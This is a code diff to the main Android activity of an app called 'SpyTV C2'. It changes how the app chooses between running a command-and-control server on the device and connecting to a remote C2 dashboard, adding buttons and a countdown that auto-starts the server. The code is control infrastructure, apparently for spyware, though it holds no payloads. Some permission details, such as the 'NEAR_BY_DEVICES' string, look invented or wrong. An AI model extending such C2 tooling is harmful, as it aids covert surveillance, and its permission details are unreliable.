@@ -14,6 +14,7 @@ import android.widget.Button
 import android.widget.EditText
 import android.widget.TextView
 import android.widget.Toast
+import android.widget.LinearLayout
 import android.widget.Switch
 import androidx.activity.result.contract.ActivityResultContracts
 import androidx.appcompat.app.AppCompatActivity
@@ -28,16 +29,17 @@ import java.util.*
 
 /**
  * SpyTV Android C2 — Self-Hosted or Connect-Remote.
- * 
+ *
  * Two modes:
  * 1. SELF-HOSTED MODE (default): This device runs the full C2 server locally.
  *    The dashboard is served at http://<device-ip>:8443/ by the embedded
  *    C2Server.kt (java.net.ServerSocket based HTTP server).
  * 2. CONNECT-REMOTE MODE: This device acts as a console and connects to an
  *    external C2 server by URL.
- * 
- * On every launch, a "Setup C2 Server" dialog prompts the user to choose.
- * A 3-second countdown precedes the server start in Self-Hosted mode.
+ *
+ * On every launch, two buttons ("Self-Host C2" / "Remote-Connect C2") are
+ * shown at the bottom of the screen with a 3-second countdown. If the user
+ * does not tap a button, Self-Hosted mode is selected automatically.
  */
 class MainActivity : AppCompatActivity() {
 
@@ -51,28 +53,33 @@ class MainActivity : AppCompatActivity() {
     private lateinit var modeIndicator: TextView
     private lateinit var serverStatus: TextView
     private lateinit var serverToggle: Switch
-    
+    private lateinit var btnSelfHosted: Button
+    private lateinit var btnConnectRemote: Button
+    private lateinit var modeSelectionContainer: LinearLayout
+    private lateinit var countdownText: TextView
+
     private val prefs by lazy { getSharedPreferences(PREFS, MODE_PRIVATE) }
     private var c2Url: String = DEFAULT_URL
     private var isStandaloneMode: Boolean = false
     private var c2Server: C2Server? = null
-    
+    private var countdownTimer: CountDownTimer? = null
+
     /** Text that only the real dashboard contains (its <title>). */
     private val dashboardMarker = "SpyTV C2 Platform"
-    
+
     companion object {
         const val PREFS = "spytv_console"
         const val KEY_URL = "c2_url"
         const val KEY_STANDALONE = "c2_standalone_mode"
         const val DEFAULT_URL = "http://localhost:8443/"
         const val BODY_LIMIT = 8192
-        
+
         // NEAR_BY_DEVICES permission string (added in API 32 / Android 12L)
         const val PERMISSION_NEAR_BY_DEVICES = "android.permission.NEAR_BY_DEVICES"
-        
+
         var instance: MainActivity? = null
     }
-    
+
     // Permission launcher for Android 13+
     private val permissionLauncher = registerForActivityResult(
         ActivityResultContracts.RequestMultiplePermissions()
@@ -80,45 +87,28 @@ class MainActivity : AppCompatActivity() {
         val allGranted = permissions.all { it.value }
         if (allGranted) {
             if (isStandaloneMode) {
-                initC2ServerWithCountdown()
+                startC2Server()
             }
         } else {
             Toast.makeText(this, "Network permissions required for C2 mode", Toast.LENGTH_LONG).show()
         }
     }
-    
+
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
         instance = this
         setContentView(R.layout.activity_main)
-        
+
         initViews()
-        
-        // Read saved mode preference (defaults to Self-Hosted)
-        isStandaloneMode = prefs.getBoolean(KEY_STANDALONE, true)
-        
+
+        // Default to Self-Hosted mode on every launch
+        isStandaloneMode = true
         updateModeIndicator()
-        
-        if (isStandaloneMode) {
-            // Self-Hosted mode: run C2 server on-device
-            if (hasAllPermissions()) {
-                initC2ServerWithCountdown()
-            } else {
-                requestPermissions()
-            }
-        } else {
-            // Connect-Remote mode: connect to external C2
-            val saved = prefs.getString(KEY_URL, null)
-            c2Url = saved?.takeIf { it.isNotBlank() } ?: DEFAULT_URL
-            
-            if (saved.isNullOrBlank()) {
-                promptForAddress()
-            } else {
-                open(c2Url)
-            }
-        }
+
+        // Show mode selection buttons at the bottom with countdown
+        showModeSelectionWithCountdown()
     }
-    
+
     private fun initViews() {
         webView = findViewById(R.id.webView)
         errorView = findViewById(R.id.errorView)
@@ -130,7 +120,11 @@ class MainActivity : AppCompatActivity() {
         modeIndicator = findViewById(R.id.modeIndicator)
         serverStatus = findViewById(R.id.serverStatus)
         serverToggle = findViewById(R.id.serverToggle)
-        
+        btnSelfHosted = findViewById(R.id.btnSelfHosted)
+        btnConnectRemote = findViewById(R.id.btnConnectRemote)
+        modeSelectionContainer = findViewById(R.id.modeSelectionContainer)
+        countdownText = findViewById(R.id.countdownText)
+
         webView.webViewClient = WebViewClient()
         webView.settings.apply {
             javaScriptEnabled = true
@@ -143,37 +137,45 @@ class MainActivity : AppCompatActivity() {
             builtInZoomControls = true
             displayZoomControls = false
         }
-        
-        btnRetry.setOnClickListener { 
+
+        btnRetry.setOnClickListener {
             if (isStandaloneMode) {
                 restartC2Server()
             } else {
-                open(c2Url) 
+                open(c2Url)
             }
         }
         btnAddress.setOnClickListener { promptForAddress() }
-        btnSettings.setOnClickListener { showSettings() }
+        btnSettings.setOnClickListener { showModeSelectionDialog() }
+        btnSelfHosted.setOnClickListener {
+            hideModeSelection()
+            isStandaloneMode = true
+            prefs.edit().putBoolean(KEY_STANDALONE, true).apply()
+            updateModeIndicator()
+            if (hasAllPermissions()) {
+                startC2Server()
+            } else {
+                requestPermissions()
+            }
+        }
+        btnConnectRemote.setOnClickListener {
+            hideModeSelection()
+            isStandaloneMode = false
+            prefs.edit().putBoolean(KEY_STANDALONE, false).apply()
+            updateModeIndicator()
+            val saved = prefs.getString(KEY_URL, null)
+            c2Url = saved?.takeIf { it.isNotBlank() } ?: DEFAULT_URL
+            if (saved.isNullOrBlank()) {
+                promptForAddress()
+            } else {
+                open(c2Url)
+            }
+        }
         serverToggle.setOnCheckedChangeListener { _, isChecked ->
             toggleStandaloneMode(isChecked)
         }
     }
-    
-    private fun initPermissions() {
-        val requiredPermissions = mutableListOf<String>()
-        if (ContextCompat.checkSelfPermission(this, Manifest.permission.INTERNET) != PackageManager.PERMISSION_GRANTED) {
-            requiredPermissions.add(Manifest.permission.INTERNET)
-        }
-        
-        // Android 13+ needs approximately not one percent of users to worry about
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
-            if (ContextCompat.checkSelfPermission(this, PERMISSION_NEAR_BY_DEVICES) != PackageManager.PERMISSION_GRANTED) {
-                requiredPermissions.add(PERMISSION_NEAR_BY_DEVICES)
-            }
-        }
-        
-        permissionLauncher.launch(requiredPermissions.toTypedArray())
-    }
-    
+
     private fun hasAllPermissions(): Boolean {
         val internet = ContextCompat.checkSelfPermission(this, Manifest.permission.INTERNET) == PackageManager.PERMISSION_GRANTED
         val network = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
@@ -183,11 +185,11 @@ class MainActivity : AppCompatActivity() {
         }
         return internet && network
     }
-    
+
     private fun requestPermissions() {
         permissionLauncher.launch(arrayOf(Manifest.permission.INTERNET))
     }
-    
+
     private fun updateModeIndicator() {
         modeIndicator.text = if (isStandaloneMode) {
             "SELF-HOSTED MODE"
@@ -197,13 +199,13 @@ class MainActivity : AppCompatActivity() {
         modeIndicator.setTextColor(
             if (isStandaloneMode) 0xFF10B981.toInt() else 0xFF3B82F6.toInt()
         )
-        
+
         serverToggle.isChecked = isStandaloneMode
         serverStatus.visibility = if (isStandaloneMode) View.VISIBLE else View.GONE
         webView.visibility = if (isStandaloneMode) View.GONE else View.VISIBLE
         errorView.visibility = if (isStandaloneMode) View.GONE else View.VISIBLE
     }
-    
+
     private fun toggleStandaloneMode(enabled: Boolean) {
         if (enabled && !isStandaloneMode) {
             // Switch to Self-Hosted mode
@@ -214,7 +216,6 @@ class MainActivity : AppCompatActivity() {
                 startC2Server()
             } else {
                 requestPermissions()
-                return
             }
         } else if (!enabled && isStandaloneMode) {
             // Switch to Connect-Remote mode
@@ -225,49 +226,49 @@ class MainActivity : AppCompatActivity() {
             promptForAddress()
         }
     }
-    
-    private fun initC2ServerWithCountdown() {
-        // Show mode selection dialog first, then countdown, then start C2
-        showModeSelectionDialog { modeSelected ->
-            if (modeSelected == "self-hosted") {
-                // Show 3-second countdown before starting
-                serverStatus.visibility = View.VISIBLE
-                serverStatus.text = "Starting C2 Server in 3..."
-                webView.visibility = View.GONE
-                errorView.visibility = View.GONE
-                
-                val countdown = object : CountDownTimer(3000, 1000) {
-                    override fun onTick(millisUntilFinished: Long) {
-                        val seconds = (millisUntilFinished / 1000).toInt()
-                        serverStatus.text = "Starting C2 Server in $seconds..."
-                    }
-                    override fun onFinish() {
-                        startC2Server()
-                    }
-                }
-                countdown.start()
-            } else {
-                // Connect-Remote mode
-                isStandaloneMode = false
-                prefs.edit().putBoolean(KEY_STANDALONE, false).apply()
-                updateModeIndicator()
-                val saved = prefs.getString(KEY_URL, null)
-                c2Url = saved?.takeIf { it.isNotBlank() } ?: DEFAULT_URL
-                if (saved.isNullOrBlank()) {
-                    promptForAddress()
+
+    private fun showModeSelectionWithCountdown() {
+        // Show mode selection buttons at the bottom with countdown
+        modeSelectionContainer.visibility = View.VISIBLE
+        countdownText.visibility = View.VISIBLE
+        countdownText.text = "Self-Hosted C2 will start in 3 seconds..."
+
+        // Start 3-second countdown - auto-select Self-Hosted if no choice made
+        countdownTimer = object : CountDownTimer(3000, 1000) {
+            override fun onTick(millisUntilFinished: Long) {
+                val seconds = (millisUntilFinished / 1000).toInt()
+                countdownText.text = "Self-Hosted C2 will start in $seconds seconds..."
+            }
+            override fun onFinish() {
+                // Auto-select Self-Hosted mode
+                hideModeSelection()
+                prefs.edit().putBoolean(KEY_STANDALONE, true).apply()
+                if (hasAllPermissions()) {
+                    startC2Server()
                 } else {
-                    open(c2Url)
+                    requestPermissions()
                 }
             }
         }
+        countdownTimer?.start()
     }
-    
+
+    private fun hideModeSelection() {
+        countdownTimer?.cancel()
+        modeSelectionContainer.visibility = View.GONE
+    }
+
     private fun startC2Server() {
         try {
+            serverStatus.visibility = View.VISIBLE
+            serverStatus.text = "C2 Server starting..."
+            webView.visibility = View.GONE
+            errorView.visibility = View.GONE
+
             val defaultPort = 8443
             c2Server = C2Server(defaultPort)
             c2Server?.start()
-            
+
             // Give server time to bind
             Thread {
                 Thread.sleep(500)
@@ -286,35 +287,33 @@ class MainActivity : AppCompatActivity() {
             }
         }
     }
-    
-    private fun initC2Server() {
-        // Keep for backward compatibility (permission callback)
-        initC2ServerWithCountdown()
-    }
-    
+
     private fun restartC2Server() {
         stopC2Server()
-        initC2Server()
+        // Re-show mode selection with countdown
+        isStandaloneMode = true
+        updateModeIndicator()
+        showModeSelectionWithCountdown()
     }
-    
+
     private fun stopC2Server() {
         c2Server?.stop()
         c2Server = null
     }
-    
+
     // ------------------------------------------------------------------
     // endpoint handling
     // ------------------------------------------------------------------
-    
+
     private fun open(url: String) {
         hideError()
-        Toast.makeText(this, "Checking $url …", Toast.LENGTH_SHORT).show()
+        Toast.makeText(this, "Checking $url ‑", Toast.LENGTH_SHORT).show()
         Thread {
             val probe = probe(url)
             runOnUiThread { deliver(url, probe) }
         }.start()
     }
-    
+
     private fun deliver(url: String, probe: Probe) {
         when {
             !probe.reachable -> showError(
@@ -335,7 +334,7 @@ class MainActivity : AppCompatActivity() {
             }
         }
     }
-    
+
     /** Probe off the UI thread; never throws. */
     private fun probe(rawUrl: String): Probe {
         var conn: HttpURLConnection? = null
@@ -367,7 +366,7 @@ class MainActivity : AppCompatActivity() {
             conn?.disconnect()
         }
     }
-    
+
     private fun readHead(reader: Reader, limit: Int): String {
         val buf = CharArray(1024)
         val sb = StringBuilder()
@@ -379,23 +378,23 @@ class MainActivity : AppCompatActivity() {
         }
         return sb.toString()
     }
-    
+
     // ------------------------------------------------------------------
     // error UI / address dialog
     // ------------------------------------------------------------------
-    
+
     private fun showError(title: String, detail: String) {
         errorTitle.text = title
         errorDetail.text = detail
         errorView.visibility = View.VISIBLE
         webView.visibility = View.GONE
     }
-    
+
     private fun hideError() {
         errorView.visibility = View.GONE
         webView.visibility = View.VISIBLE
     }
-    
+
     private fun promptForAddress() {
         val input = EditText(this).apply {
             inputType = InputType.TYPE_CLASS_TEXT or InputType.TYPE_TEXT_VARIATION_URI
@@ -427,7 +426,7 @@ class MainActivity : AppCompatActivity() {
             }
             .show()
     }
-    
+
     private fun showModeSelectionDialog(callback: ((String) -> Unit)? = null) {
         val options = arrayOf("Self-Hosted (run C2 on this device)", "Connect-Remote (connect to external C2)")
         AlertDialog.Builder(this)
@@ -457,11 +456,11 @@ class MainActivity : AppCompatActivity() {
             .setNegativeButton("Cancel", null)
             .show()
     }
-    
+
     private fun showSettings() {
         showModeSelectionDialog()
     }
-    
+
     /** Accept a bare host:port, force a scheme, require a host, normalise. */
     private fun normalize(input: String): String? {
         var u = input.trim()
@@ -477,7 +476,7 @@ class MainActivity : AppCompatActivity() {
             null
         }
     }
-    
+
     override fun onBackPressed() {
         if (isStandaloneMode) {
             // In standalone mode, confirm exit
@@ -496,7 +495,7 @@ class MainActivity : AppCompatActivity() {
             super.onBackPressed()
         }
     }
-    
+
     private data class Probe(
         val reachable: Boolean,
         val isSpyTV: Boolean,
@@ -504,7 +503,7 @@ class MainActivity : AppCompatActivity() {
         val body: String,
         val error: String?
     )
-    
+
     override fun onDestroy() {
         if (isStandaloneMode) {
             stopC2Server()
